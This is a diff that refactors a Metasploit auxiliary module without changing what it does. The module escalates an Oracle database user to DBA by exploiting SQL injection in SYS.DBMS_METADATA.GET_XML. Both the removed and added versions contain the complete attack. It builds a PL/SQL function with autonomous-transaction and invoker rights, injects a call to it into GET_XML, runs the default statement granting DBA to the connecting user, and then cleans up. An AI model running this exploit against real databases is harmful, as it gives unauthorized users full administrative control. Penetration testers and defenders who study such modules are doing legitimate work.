@@ -1,64 +1,59 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::ORACLE
 
-class Metasploit3 < Msf::Auxiliary
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_METADATA.GET_XML',
+      'Description'    => %q{
+        This module will escalate an Oracle DB user to DBA by exploiting a sql injection
+        bug in the SYS.DBMS_METADATA.GET_XML package/function.
+      },
+      'Author'         => [ 'MC' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'URL', 'http://www.metasploit.com' ],
+        ],
+      'DisclosureDate' => '2008-01-05'))
 
-	include Msf::Exploit::ORACLE
+      register_options(
+        [
+          OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
+        ])
+  end
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_METADATA.GET_XML',
-			'Description'    => %q{
-				This module will escalate a Oracle DB user to DBA by exploiting an sql injection
-				bug in the SYS.DBMS_METADATA.GET_XML package/function.
-			},
-			'Author'         => [ 'MC' ],
-			'License'        => MSF_LICENSE,
-			'References'     =>
-				[
-					[ 'URL', 'http://www.metasploit.com' ],
-				],
-			'DisclosureDate' => 'Jan 5 2008'))
+  def run
+    return if not check_dependencies
 
-			register_options(
-				[
-					OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-				], self.class)
-	end
+    name = Rex::Text.rand_text_alpha(rand(10) + 1)
 
-	def run
-		return if not check_dependencies
+    function = "
+      create or replace function #{datastore['DBUSER']}.#{name} return varchar2
+      authid current_user is pragma autonomous_transaction;
+      begin
+      execute immediate '#{datastore['SQL']}';
+      return '';
+      end;
+      "
 
-		name = Rex::Text.rand_text_alpha(rand(10) + 1)
+    package = "select sys.dbms_metadata.get_xml('''||#{datastore['DBUSER']}.#{name}()||''','') from dual"
 
-		function = "
-			create or replace function #{datastore['DBUSER']}.#{name} return varchar2
-			authid current_user is pragma autonomous_transaction;
-			begin
-			execute immediate '#{datastore['SQL']}';
-			return '';
-			end;
-			"
+    clean = "drop function #{name}"
 
-		package = "select sys.dbms_metadata.get_xml('''||#{datastore['DBUSER']}.#{name}()||''','') from dual"
+    print_status("Sending function...")
+    prepare_exec(function)
 
-		clean = "drop function #{name}"
-
-		print_status("Sending function...")
-		prepare_exec(function)
-
-		begin
-			print_status("Attempting sql injection on SYS.DBMS_METADATA.GET_XML...")
-			prepare_exec(package)
-		rescue ::OCIError => e
-			print_status("Removing function '#{name}'...")
-			prepare_exec(clean)
-		end
-	end
+    begin
+      print_status("Attempting sql injection on SYS.DBMS_METADATA.GET_XML...")
+      prepare_exec(package)
+    rescue ::OCIError => e
+      print_status("Removing function '#{name}'...")
+      prepare_exec(clean)
+    end
+  end
 end
